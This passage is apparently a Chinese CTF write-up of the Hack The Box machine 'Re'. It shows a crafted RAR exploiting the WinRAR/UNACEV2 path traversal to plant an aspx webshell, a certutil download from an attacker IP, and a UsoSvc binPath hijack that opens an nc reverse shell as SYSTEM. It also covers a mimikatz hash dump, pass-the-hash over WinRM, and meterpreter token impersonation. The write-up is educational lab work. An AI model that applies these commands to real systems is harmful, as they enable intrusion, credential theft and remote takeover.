    }
留意到脚本最后的部分，脚本会把通过检测的ods进行打包，文件名为md5的hash值，压缩格式为rar，看到rar很容易联想到去年爆出的目录穿越漏洞（CVE-2018-20250），具体可以查看以下这篇文章：
然后查看Program
Files目录，靶机没有安装WinRAR，不过发现有PeaZip，这个软件比较陌生，查了一下存在一个命令注入漏洞：
但是靶机安装的版本不在影响范围：
    VersionInfo       : File:             C:Program FilesPeaZippeazip.exe
                        InternalName:     PeaZip
                        OriginalFilename: PeaZip
                        FileVersion:      6.7.0
                        FileDescription:  PeaZip, file and archive manager
                        Product:          PeaZip
                        ProductVersion:   6.7.0
                        Debug:            False
                        Patched:          False
                        PreRelease:       False
                        PrivateBuild:     False
                        SpecialBuild:     False
                        Language:         English (United States)
继续检查peazip的目录，发现这个软件同样有`UNACEV2.DLL`，那么理论上Winrar目录穿越的漏洞在这个软件上同样可行。
        Directory: C:Program FilesPeaZipresunace
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----    -a----         9/1/2007   2:56 PM            601 note_install.txt
    -a----        1/15/2010  12:29 PM           1304 peazip-unace-WIN64.iss
    -a----        1/15/2010  12:27 PM           1269 peazip-unace-WINDOWS.iss
    -a----         6/2/2007   9:41 AM          27136 unace.exe
    -a----        8/26/2005   2:50 AM          77312 UNACEV2.DLL
    -a----        3/20/2019   2:12 PM           1565 unins000.dat
    -a----        3/20/2019   2:11 PM         707354 unins000.exe
使用  的脚本生成rar文件。
需要修改代码如下：
    # The archive filename you want
    rar_filename = "test.rar"
    # The evil file you want to run
    evil_filename = "shell.exe"
    # The decompression path you want, such shown below
    target_filename = r"C:C:C:../../../../../../../tmp/kira.exe"
将生成文件放入`C:UserslukeDocumentsods`，注意需要修改文件名为`md5.rar`
    certutil.exe -urlcache -split -f http://10.10.14.220:23333/test.rar C:UserslukeDocumentsodsee6ea50adb1d71c85d28d2c56c13e166.rar
然后查看tmp可发现成功写入
        Directory: C:tmp
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----    -a----         2/1/2020   6:54 PM           2109 kira.exe
然后需要思考的是，需要把什么文件写入什么目录，一般的利用思路是将后门程序写入用户的启动项，但是HTB的靶机并不会重启，只会重置，因此这个套路是行不通的。
查看一下写入文件的权限，发现owner是另外一个用户cam，那么猜测执行解压的脚本用户是cam。
    get-acl kira.exe|format-list
    Path   : Microsoft.PowerShell.CoreFileSystem::C:tmpkira.exe
    Owner  : REcam
    Group  : RENone
    Access : NT AUTHORITYSYSTEM Allow  FullControl
             BUILTINAdministrators Allow  FullControl
             BUILTINUsers Allow  ReadAndExecute, Synchronize
             REcam Allow  FullControl
    Audit  :
    Sddl   : O:S-1-5-21-311800348-2366743891-1978325779-1002G:S-1-5-21-311800348-2366743891-1978325779-513D:AI(A;ID;FA;;;SY
             )(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;FA;;;S-1-5-21-311800348-2366743891-1978325779-1002)
回想起有web服务，找一下web的路径看看，发现当前用户是没权限访问，那么cam有可能可以吗？
        Directory: C:inetpubwwwroot
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----    d-----         2/1/2020   6:54 PM                blog
    d-----        3/27/2019   2:10 PM                ip
    d-----        6/18/2019  10:18 PM                re
    C:inetpubwwwrootblog
    Access is denied.
网上找一个aspx大马，修改一下生成rar的exp
    # The archive filename you want
    rar_filename = "test.rar"
    # The evil file you want to runkira
    evil_filename = "kira.aspx"
    # The decompression path you want, such shown below
    target_filename = r"C:C:C:../../../../../../../inetpub/wwwroot/blog/kira.aspx"
成功获取到一个webshell！
分别把webshell写到`ip`和`re`目录，发现有跟`blog`不同的用户权限，其中`iis apppoolre`可以打开根目录`proj_drop`
    PS C:> get-acl proj_drop|format-list
    Path   : Microsoft.PowerShell.CoreFileSystem::C:proj_drop
    Owner  : BUILTINAdministrators
    Group  : RENone
    Access : CREATOR OWNER Allow  FullControl
             NT AUTHORITYSYSTEM Allow  FullControl
             BUILTINAdministrators Allow  FullControl
             REcoby Allow  Modify, Synchronize
             REcam Allow  FullControl
             IIS APPPOOLre Allow  ReadAndExecute, Synchronize
             IIS APPPOOLre Allow  Write, Synchronize
`proj_drop`这个目录比较可疑，放文件进去同样会消失，有可能延续之前的套路，在里面放入合适的文件，触发特定的漏洞，重新查看题目的博客，看看是否有提示。
简单看了一下，作者自己都未能成功利用漏洞，而且环境中并没有发现开放18001端口，（作者有疑似利用题目收exp的嫌疑[震惊]），需要寻找其他思路。
    Active Connections
      Proto  Local Address          Foreign Address        State           PID
      TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
      TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       816
      TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
      TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
      TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
      TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       448
      TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       960
      TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       312
      TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1656
      TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       584
      TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       596
## UsoSvc提权
思路断了，这时候需要执行一些辅助脚本进行检测。这里我使用了`PowerUp.ps1`
    powershell -ep bypass
    Import-Module .PowerUp.ps1
    Invoke-AllChecks
脚本回显提示有服务的权限异常
    [*] Checking service permissions...
    ServiceName   : UsoSvc
    Path          : C:Windowssystem32svchost.exe -k netsvcs -p
    StartName     : LocalSystem
    AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
    CanRestart    : True
通过修改UsoSvc服务的binPath，然后重新启动服务即可执行我们的命令
    PS C:> sc.exe stop UsoSvc
    PS C:> sc.exe config usosvc binPath="C:WindowsSystem32spooldriverscolornc.exe 10.10.14.220 23336 -e cmd.exe"
    PS C:> sc.exe qc usosvc
    PS C:> sc.exe start UsoSvc
反弹shell直接拿到system权限，但是最后一步查看`root.txt`竟然无法打开，查看权限
    PS C:tmp> get-acl C:UsersAdministratorDesktoproot.txt|format-list
    Path   : Microsoft.PowerShell.CoreFileSystem::C:UsersAdministratorDesktoproot.txt
    Owner  : REcoby
    Group  : RENone
    Access : NT AUTHORITYSYSTEM Allow  FullControl
             BUILTINAdministrators Allow  FullControl
             REAdministrator Allow  FullControl
             REcoby Allow  FullControl
但是打不开，明明是有权限的
    C:Windowssystem32>type C:UsersAdministratorDesktoproot.txt
    Access is denied.
用以下命令修改权限后仍然打不开
    cacls C:UsersAdministratorDesktoproot.txt /e /p system:f
## mimikatz dump（easy way）
留意到Administrator和coby都可以打开root.txt，何不尝试一下切换到其他用户。上传mimikatz，导出所有用户hash
    privilege::debug
    token::elevate
    lsadump::sam
由于我们是system权限，轻松获取到其他用户的NTLM hash。
    User : Administrator
      Hash NTLM: caf97bbc4c410103485a3cf950496493
    User : coby
      Hash NTLM: fa88e03e41fdf7b707979c50d57c06cf
之前查看端口发现，靶机是有开放5985端口，不过有防火墙，所以端口扫描时并没有发现，而winrm是可以通过hash进行登录的。
然后用ew转发winrm的端口到本地
    攻击端主机：
    ./ew_for_linux64 -s lcx_listen -l 5985 -e 23335
    靶机：
    ew.exe -s lcx_slave -d 10.10.14.220 -e 23335 -f 127.0.0.1 -g 5985
使用coby的hash可以登录并读到root.txt
    root@kali:~/pentest/Re# evil-winrm -i 127.0.0.1 -u coby -H fa88e03e41fdf7b707979c50d57c06cf
    Evil-WinRM shell v2.1
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:UserscobyDocuments> type C:UsersAdministratorDesktoproot.txt
    1B4FB9xxxxxxxxxxxxxxxxxxxx8F7715D
## incognito（very easy way）
为何有权限却读不到flag呢？事后请教了一位外国友人，原来是因为文件被加密（EFS）了，因此即使有权限也是打不开的。使用cipher命令检查root.txt，看到文件被加密了，只有`Administrator`和`coby`可以解密。
    PS C:UsersAdministratorDesktop> cipher /c root.txt
     Listing C:UsersAdministratorDesktop
     New files added to this directory will not be encrypted.
    E root.txt
      Compatibility Level:
        Windows XP/Server 2003
      Users who can decrypt:
        REAdministrator [Administrator(Administrator@RE)]
        Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D
        coby(coby@RE)
        Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0
      No recovery certificate found.
      Key information cannot be retrieved.
    The specified file could not be decrypted.
这次使用msf进行，按照之前的步骤获取system之后马上执行之前放进去的后门反弹shell。
`meterpreter`里面`incognito`模块可以进行用户切换，这个方法比用mimikatz还要再简单一点。
    meterpreter > load incognito  # 用来盗窃目标主机的令牌或是假冒用户
    Loading extension incognito...Success.
    meterpreter > list_tokens -u  # 列出目标主机用户的可用令牌
    Delegation Tokens Available
    ========================================
    Font Driver HostUMFD-0
    Font Driver HostUMFD-1
    IIS APPPOOLip
    IIS APPPOOLre
    IIS APPPOOLREblog
    NT AUTHORITYIUSR
    NT AUTHORITYLOCAL SERVICE
    NT AUTHORITYNETWORK SERVICE
    NT AUTHORITYSYSTEM
    REcam
    REcoby
    REluke
    Window ManagerDWM-1
    Impersonation Tokens Available
    ========================================
    No tokens available
    meterpreter > impersonate_token "RE\coby"
    [+] Delegation token available
    [+] Successfully impersonated user REcoby
    meterpreter > cat c:\users\administrator\desktop\root.txt
    1B4FB9xxxxxxxxxxxxxxxxxxx8F7715D
至此渗透完毕
    C:tmp>whoami /user
    USER INFORMATION
    ----------------    
    User Name SID
    ========= =============================================
    recoby   S-1-5-21-311800348-2366743891-1978325779-1000
## 总结
这个box的渗透过程还是比较艰辛，获取到的每个用户权限都不是很大，需要理解自动脚本的运行过程和猜测脚本运行效果，即使知道漏洞利用方式还要进一步思考如何利用，即便是到最后拿system权限后，还需一顿操作才最终拿到flag。